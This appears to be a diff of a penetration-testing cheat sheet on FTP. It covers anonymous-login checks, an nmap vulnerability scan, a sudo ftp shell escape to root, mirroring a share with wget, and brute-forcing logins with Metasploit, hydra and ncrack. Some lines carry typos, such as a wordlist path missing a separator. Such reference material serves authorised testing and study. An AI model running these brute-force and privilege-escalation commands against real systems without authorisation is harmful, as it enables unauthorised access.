@@ -1,41 +1,80 @@
-# One of the first things we may try is to perform an anonymous login, this can be
-# done by logging with username equal to "anonymous" and a blank password or using
-# as password "anonymous" again.
+---
+tags: [pentest, ftp]
+---
 
-Example of anonymous login and file download:
-```sh
+# Common commands list:
+ cd <directory> - change remote directory
+ lcd <directory> - change local directory
+ put <file> - upload file
+ get <file> - download file
+
+# Common FTP commands:
+ USER - authentication username
+ PASS - authentication password
+ QUIT - disconnects
+ LIST - list info of a file or dir if specified, else list info of current dir
+ NLST - list of file names in a specified directory
+ RETR - retrieve a copy of file
+ DELE - delete file
+ RNTO - rename file
+ SYST - system file information
+ CDUP - change to parent directory
+ CWD - change working directory
+ ACCT - account information
+ PASV - enter passive mode (client can send data to ports > 1023)
+ EPSV - enter extensive passive mode
+ LPSV - enter long passive mode
+ MKD - make a directory
+ RMD - remove a directory
+ RMDA - remove a directory tree
+ PORT - specify address and port to which the server should connect
+ PWD - print working directory
+
+# Discover if anonymous login is enabled, default port is 21
+telnet <FTP_ip_address> <port>
+USER anonymous
+# If enabled, the server will respond with
+# 331 Anonymous login ok, send complete email address as your password
+# Password will be blank or "anonymous"
+PASS <email></email>
+PASS <email>anonymous</email>
+# A successful response will be
+# 230 Anonymous access granted, restrictions apply
+
+# Anonymous login and file download
 telnet <FTP_ip_address> <port> (default:21)
 USER anonymous
-331 Anonymous login ok, send complete email address as your password
+# 331 Anonymous login ok, send complete email address as your password
 PASS <email></email>
-230 Anonymous access granted, restrictions apply
+# 230 Anonymous access granted, restrictions apply
 CWD <directory>
-250 CWD command successful
+# 250 CWD command successful
 PASV
-227 Entering Passive Mode (64,170,98,33,151,31).
+# 227 Entering Passive Mode (64,170,98,33,151,31).
 RETR <file></file>
-150 Opening ASCII mode data connection for <ftp_server></ftp_server> (6060 bytes)
-226 Transfer complete
+# 150 Opening ASCII mode data connection for <ftp_server></ftp_server> (6060 bytes)
+# 226 Transfer complete
 QUIT
-221 Goodbye.
-```
-
-Other useful FTP commands:
-```sh
-cd <directory> - change remote directory
-lcd <directory> - change local directory
-put <file> - upload file
-get <file> - download file
-```
-
-# Download entire FTP directory
-wget -m --no-passive ftp://anonoymous:anonymous@1.1.1.1
+# 221 Goodbye.
 
 # Test for common FTP vulnerabilities with nmap
 nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <target-ip>
 
+# Spawn shell using FTP
+# Once inside the victim machine, get root access through FTP
+sudo ftp
+! /bin/bash
+whoami
+# Or
+! /bin/sh
+id
+whoami
+> root
 
-# Bruteforce ftp login with metasploit module
+# Download entire FTP directory with wget
+wget -m --no-passive ftp://anonoymous:anonymous@1.1.1.1
+
+# Bruteforce FTP login with metasploit module
 msf> use auxiliary/scanner/ftp/ftp_login
 msf> set RHOSTS 192.168.69.50-254
 msf> set THREADS 205
@@ -43,9 +82,6 @@ msf> set USER_FILE <path to file>
 msf> set PASS_FILE <path to file>
 msf> run
 
-
-# Bruteforce ftp login with hydra
+# Bruteforce FTP login with hydra
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <target-ip> ftp -V
 
-# Bruteforce ftp login with ncrack
-ncrack -U users.txt -P /usr/share/passwords.txt -f <target-ip>:ftp 
